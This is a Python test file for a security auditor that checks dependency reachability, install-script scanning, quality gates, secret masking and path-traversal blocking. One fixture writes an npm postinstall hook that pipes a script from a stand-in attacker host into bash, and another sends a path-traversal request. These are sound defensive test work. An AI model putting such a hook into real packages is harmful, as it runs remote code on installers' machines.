"""Tests for v1.1 industry-grade upgrades: Reachability, Install-Script Guard, Quality Gate, Runbooks & Triage API."""

from __future__ import annotations

import json
import shutil
import tempfile
import unittest
from pathlib import Path

from fastapi.testclient import TestClient

from openguard.auditor import OpenGuardAuditor
from openguard.config import AuditConfig
from openguard.models import FindingCategory
from openguard.scanners.install_script_scanner import InstallScriptScanner
from openguard.scanners.reachability_analyzer import ReachabilityAnalyzer
from openguard.web.app import create_app


class TestReachabilityAndInstallScripts(unittest.TestCase):
    def test_reachability_distinguishes_imported_vs_unused_cves(self) -> None:
        demo_dir = Path(__file__).resolve().parents[1] / "examples" / "vulnerable_demo_repo"
        report = OpenGuardAuditor(AuditConfig(offline=True)).audit(demo_dir)

        by_pkg = {v.component_name: v for v in report.vulnerabilities}
        # PyYAML is imported via `import yaml` alias in app.py
        self.assertIn("PyYAML", by_pkg)
        self.assertIs(by_pkg["PyYAML"].reachable, True)
        self.assertTrue(any("app.py:" in loc for loc in by_pkg["PyYAML"].import_locations))

        # requests is imported in app.py
        self.assertIn("requests", by_pkg)
        self.assertIs(by_pkg["requests"].reachable, True)

        # fastapi is declared in requirements.txt but never imported in demo repo source
        self.assertIn("fastapi", by_pkg)
        self.assertIs(by_pkg["fastapi"].reachable, False)

    def test_reachability_collects_js_and_go_imports(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "index.ts").write_text(
                'import axios from "axios";\nconst _ = require("lodash");\n',
                encoding="utf-8",
            )
            (root / "main.go").write_text(
                'package main\nimport (\n\t"github.com/gin-gonic/gin"\n)\n',
                encoding="utf-8",
            )
            imports = ReachabilityAnalyzer().collect_imports(root)
            self.assertIn("axios", imports["npm"])
            self.assertIn("lodash", imports["npm"])
            self.assertIn("github.com/gin-gonic/gin", imports["Go"])

    def test_install_script_scanner_catches_npm_and_setup_py(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "evil-demo",
                        "version": "1.0.0",
                        "scripts": {
                            "build": "vite build",
                            "postinstall": "curl -s http://evil.invalid/payload.sh | bash",
                        },
                    }
                ),
                encoding="utf-8",
            )
            (root / "setup.py").write_text(
                "import os\nos.system('whoami')\n",
                encoding="utf-8",
            )
            hits = InstallScriptScanner().scan_repository(root)
            ids = {h.id for h in hits}
            self.assertIn("OG-SUP-NPM-001", ids)
            self.assertIn("OG-SUP-PY-001", ids)
            self.assertTrue(all(h.category == FindingCategory.SUPPLY_CHAIN_SCRIPT for h in hits))


class TestQualityGateRunbooksAndTriageApi(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.db_path = Path(self.tmp_dir.name) / "v11_history.db"
        self.client = TestClient(create_app(db_path=self.db_path))
        self.demo_src = Path(__file__).resolve().parents[1] / "examples" / "vulnerable_demo_repo"

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def test_quality_gate_fails_on_demo_and_passes_on_self(self) -> None:
        auditor = OpenGuardAuditor(AuditConfig(offline=True))
        demo_report = auditor.audit(self.demo_src)
        self.assertIsNotNone(demo_report.summary.quality_gate)
        self.assertEqual(demo_report.summary.quality_gate.status, "FAILED")
        self.assertEqual(len(demo_report.summary.quality_gate.conditions), 5)
        cond_map = {c.metric: c for c in demo_report.summary.quality_gate.conditions}
        self.assertGreaterEqual(cond_map["reachable_high_cves"].actual, 1)
        self.assertFalse(cond_map["reachable_high_cves"].passed)

        # Every secret finding has 3-step runbook
        self.assertGreaterEqual(len(demo_report.secrets[0].runbook_steps), 3)

        self_root = Path(__file__).resolve().parents[1]
        self_report = auditor.audit(self_root)
        self.assertEqual(self_report.summary.quality_gate.status, "PASSED")

    def test_file_context_masks_secrets_and_blocks_traversal(self) -> None:
        r_ok = self.client.get(
            "/api/file-context",
            params={"target": str(self.demo_src), "file_path": "app.py", "line": 10, "radius": 3},
        )
        self.assertEqual(r_ok.status_code, 200)
        data = r_ok.json()
        self.assertEqual(data["highlight_line"], 10)
        joined = "\n".join(item["text"] for item in data["lines"])
        self.assertIn("AKIA****Z1W", joined)
        self.assertNotIn("AKIA7F4K9P2M8Q3X6Z1W", joined)

        # Path traversal attempt must return 403
        r_trav = self.client.get(
            "/api/file-context",
            params={"target": str(self.demo_src), "file_path": "../../README.md", "line": 1},
        )
        self.assertEqual(r_trav.status_code, 403)

    def test_triage_ignore_inline_and_ignorefile(self) -> None:
        work = Path(self.tmp_dir.name) / "triage_repo"
        shutil.copytree(self.demo_src, work)

        # Inline ignore line 10 in app.py
        r_inline = self.client.post(
            "/api/triage/ignore",
            json={"target": str(work), "file_path": "app.py", "line_number": 10, "mode": "inline"},
        )
        self.assertEqual(r_inline.status_code, 200)
        line10 = (work / "app.py").read_text(encoding="utf-8").splitlines()[9]
        self.assertIn("openguard: ignore", line10)

        # Ignorefile mode
        r_ign = self.client.post(
            "/api/triage/ignore",
            json={"target": str(work), "file_path": "frontend/config.js", "line_number": 1, "mode": "ignorefile"},
        )
        self.assertEqual(r_ign.status_code, 200)
        self.assertIn("frontend/config.js", (work / ".openguardignore").read_text(encoding="utf-8"))

        # Re-audit verifies both triaged items are suppressed
        after = OpenGuardAuditor(AuditConfig(offline=True)).audit(work)
        paths_lines = {(f.file_path, f.line_number) for f in after.secrets}
        self.assertNotIn(("app.py", 10), paths_lines)
        self.assertFalse(any(f.file_path == "frontend/config.js" for f in after.secrets))


if __name__ == "__main__":
    unittest.main()
